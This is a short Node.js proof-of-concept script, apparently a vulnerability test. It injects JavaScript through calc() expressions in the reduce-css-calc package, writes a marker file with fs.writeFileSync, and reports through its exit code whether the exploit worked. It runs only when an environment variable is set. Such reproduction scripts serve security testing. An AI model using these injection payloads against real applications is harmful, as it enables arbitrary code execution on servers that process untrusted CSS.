if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const reduceCSSCalc = require("reduce-css-calc");
const path = "./reduce-css-calc";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
	console.log(
		reduceCSSCalc(
			`calc(                       (global['fs'] = require('fs')))`,
		),
	);
	console.log(
		reduceCSSCalc(
			`calc(                       (fs['writeFileSync']("reduce-css-calc", "")))`,
		),
	);
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
